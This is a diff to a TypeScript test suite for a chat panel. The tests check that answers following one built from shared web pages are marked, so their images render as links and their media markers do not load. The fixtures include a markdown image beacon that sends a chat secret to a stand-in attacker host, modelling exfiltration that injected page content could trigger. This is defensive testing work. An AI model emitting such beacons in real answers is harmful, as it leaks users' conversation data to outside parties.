@@ -17,7 +17,15 @@ import {
   readVideoMessage,
 } from "./chatPanelMessages";
 import { buildVideoMessage } from "./chatVideo";
-import { answerImages, mediaContent, readSharedPages, sharedPagesLabel, sharedPagesNote } from "./sharedPages";
+import {
+  answerImages,
+  mediaContent,
+  readSharedPages,
+  sharedPagesLabel,
+  sharedPagesNote,
+  withSharedPageMarks,
+  type SharedPages,
+} from "./sharedPages";
 
 describe("the server's mark on an answer built from shared pages", () => {
   it("is read with its sites", () => {
@@ -85,6 +93,82 @@ describe("how the chat shows such an answer", () => {
   it("explains why its images are links", () => {
     expect(sharedPagesNote({ sites: ["a.example"], inherited: false })).toMatch(/^Built from a page .* shown as links/);
     expect(sharedPagesNote({ sites: ["a.example"], inherited: true })).toMatch(/^An earlier answer in this chat .* shown as links/);
+  });
+});
+
+describe("an answer that follows one built from shared pages", () => {
+  type Message = { role: "user" | "assistant"; content: string; pageContext?: SharedPages };
+  const fromPage: SharedPages = { sites: ["docs.example.com"], inherited: false };
+  const beacon = "![chart](https://evil.example/pixel.png?chat=secret)";
+
+  /** A chat with an answer about a page (unless `mark` is null), then a follow-up the server has not marked yet. */
+  function chatWith(followUp: string, mark: SharedPages | null = fromPage): Message[] {
+    return [
+      { role: "user", content: "Summarize the page" },
+      { role: "assistant", content: "The page says to open the chart.", ...(mark ? { pageContext: mark } : {}) },
+      { role: "user", content: "Show me the chart" },
+      { role: "assistant", content: followUp },
+    ];
+  }
+
+  it("is marked as one from its placeholder on, before the server's mark arrives", () => {
+    const placeholder = withSharedPageMarks(chatWith(""));
+    expect(placeholder[3].pageContext).toEqual({ sites: ["docs.example.com"], inherited: true });
+    const streaming = withSharedPageMarks(chatWith(`Here it is: ${beacon}`));
+    expect(streaming[3].pageContext).toEqual({ sites: ["docs.example.com"], inherited: true });
+    expect(sharedPagesLabel(streaming[3].pageContext!)).toBe("In a chat with a page from docs.example.com");
+  });
+
+  it("shows its images as links while it streams, and none of its media markers as media", () => {
+    expect(answerImages(withSharedPageMarks(chatWith(`Here it is: ${beacon}`))[3])).toBe("link");
+    const image = buildImageMessage({ url: "https://evil.example/x.png?chat=secret", prompt: "", model: "m" });
+    expect(readImageMessage(mediaContent(withSharedPageMarks(chatWith(image))[3]))).toBeNull();
+    expect(mediaContent(withSharedPageMarks(chatWith(IMAGE_PENDING_MARKER))[3])).toBe("");
+  });
+
+  it("leaves the questions, and the answers before the first page, as they are", () => {
+    const chat: Message[] = [
+      { role: "user", content: "Hello" },
+      { role: "assistant", content: `Hi ${beacon}` },
+      ...chatWith("More"),
+    ];
+    const marked = withSharedPageMarks(chat);
+    expect(marked.slice(0, 5)).toEqual(chat.slice(0, 5));
+    expect(marked[1]).toBe(chat[1]);
+    expect(answerImages(marked[1])).toBe("load");
+    expect(marked[4].pageContext).toBeUndefined();
+    expect(marked[5].pageContext).toEqual({ sites: ["docs.example.com"], inherited: true });
+  });
+
+  it("keeps an answer's own mark, and carries the sites of every answer from a page", () => {
+    const serverMarked: Message = { role: "assistant", content: "Marked", pageContext: { sites: [], inherited: true } };
+    const chat: Message[] = [
+      { role: "user", content: "Summarize the page" },
+      { role: "assistant", content: "From a page", pageContext: fromPage },
+      { role: "user", content: "And this one?" },
+      { role: "assistant", content: "Also from a page", pageContext: { sites: ["wiki.example", "docs.example.com"], inherited: false } },
+      serverMarked,
+      { role: "user", content: "And?" },
+      { role: "assistant", content: "Not marked yet" },
+    ];
+    const marked = withSharedPageMarks(chat);
+    expect(marked[4]).toBe(serverMarked);
+    expect(marked[6].pageContext).toEqual({ sites: ["docs.example.com", "wiki.example"], inherited: true });
+  });
+
+  it("counts a mark without sites", () => {
+    expect(withSharedPageMarks(chatWith("Later", { sites: [], inherited: false }))[3].pageContext).toEqual({
+      sites: [],
+      inherited: true,
+    });
+  });
+
+  it("changes nothing in a chat without shared pages, whose images still load", () => {
+    const chat = chatWith(`Here it is: ${beacon}`, null);
+    expect(withSharedPageMarks(chat)).toBe(chat);
+    expect(answerImages(withSharedPageMarks(chat)[3])).toBe("load");
+    const image = buildImageMessage({ url: "/api/chat/media/7/file", prompt: "a cat", model: "m" });
+    expect(readImageMessage(mediaContent(withSharedPageMarks(chatWith(image, null))[3]))).toBeTruthy();
   });
 });
 
